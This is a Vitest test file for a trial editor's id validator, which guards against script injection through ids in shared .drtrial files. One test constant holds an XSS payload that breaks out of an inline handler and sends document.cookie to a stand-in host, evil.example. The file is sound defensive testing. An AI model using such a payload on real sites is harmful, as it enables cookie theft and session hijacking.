// Ids reach inline event handlers and data-* attributes across the views, so a
// quote character in an id closes the handler's string argument and the rest is
// evaluated as JavaScript when the view renders - no click required. Sharing
// .drtrial files is the format's whole purpose, so ids arrive from other people
// by design and their shape is a security boundary.
import { describe, expect, it } from 'vitest';
import { ID_PATTERN, findUnsafeIds, validateTrialData } from '../js/core/trialSchema.js';
import { generateId } from '../js/utils.js';

// The payload from the report: an id that terminates the handler's argument.
const BREAKOUT_ID = "tb_1'); fetch('//evil.example/'+document.cookie); ('";

function trialWith(overrides) {
  return {
    trialName: 'T',
    characters: ['FC_20000101_FIXTUR'],
    script: { lines: [] },
    minigames: [],
    truthBullets: [],
    metadata: { version: '1.0' },
    ...overrides,
  };
}

describe('id shape', () => {
  it('accepts the ids the editor itself generates', () => {
    for (const prefix of ['line', 'arg', 'q', 'a', 'panic_group']) {
      expect(ID_PATTERN.test(generateId(prefix))).toBe(true);
    }
    // And the id styles already in the corpus.
    for (const id of ['tb_1', 'mg_1', 'FC_20000101_FIXTUR', 'a-b-c']) {
      expect(ID_PATTERN.test(id)).toBe(true);
    }
  });

  it('rejects anything that could break out of a handler or an attribute', () => {
    for (const id of [BREAKOUT_ID, 'a"b', "a'b", 'a<b', 'a b', 'a\b', '', 'a&amp;b']) {
      expect(ID_PATTERN.test(id)).toBe(false);
    }
  });
});

describe('findUnsafeIds', () => {
  it('passes a clean trial', () => {
    expect(
      findUnsafeIds(
        trialWith({
          script: {
            lines: [
              { id: 'line_1', type: 'speaking', characterId: 'FC_20000101_FIXTUR', dialogue: 'x' },
              { id: 'line_2', type: 'minigame', minigameId: 'mg_1' },
            ],
          },
          minigames: [{ gameId: 'mg_1', gameType: 'nonstop_debate' }],
          truthBullets: [{ bulletId: 'tb_1', name: 'Knife' }],
        })
      )
    ).toEqual([]);
  });

  it('catches a hostile id in every field a view interpolates', () => {
    const cases = [
      ['characters', trialWith({ characters: [BREAKOUT_ID] })],
      ['line id', trialWith({ script: { lines: [{ id: BREAKOUT_ID, type: 'narrator' }] } })],
      [
        'characterId',
        trialWith({
          script: { lines: [{ id: 'line_1', type: 'speaking', characterId: BREAKOUT_ID }] },
        }),
      ],
      [
        'minigameId',
        trialWith({
          script: { lines: [{ id: 'line_1', type: 'minigame', minigameId: BREAKOUT_ID }] },
        }),
      ],
      ['gameId', trialWith({ minigames: [{ gameId: BREAKOUT_ID, gameType: 'nonstop_debate' }] })],
      ['bulletId', trialWith({ truthBullets: [{ bulletId: BREAKOUT_ID, name: 'x' }] })],
    ];
    for (const [label, data] of cases) {
      expect(findUnsafeIds(data), label).toHaveLength(1);
    }
  });

  it('quotes the offending value rather than passing it through raw', () => {
    // The message is shown to the author, so the value has to read as data.
    const [message] = findUnsafeIds(trialWith({ truthBullets: [{ bulletId: BREAKOUT_ID }] }));
    expect(message).toContain('truthBullets[0].bulletId');
    expect(message).toContain('is not a valid id: "');

    const [quoted] = findUnsafeIds(trialWith({ truthBullets: [{ bulletId: 'a"b' }] }));
    expect(quoted).toContain('a\\"b');
  });

  it('ignores absent optional ids instead of inventing failures', () => {
    // A speaking line carries no minigameId, and vice versa.
    expect(
      findUnsafeIds(trialWith({ script: { lines: [{ id: 'line_1', type: 'narrator' }] } }))
    ).toEqual([]);
  });

  it('is reported by validateTrialData too, so export cannot ship one', () => {
    const issues = validateTrialData(trialWith({ truthBullets: [{ bulletId: BREAKOUT_ID }] }));
    expect(issues.some((m) => m.includes('not a valid id'))).toBe(true);
  });
});
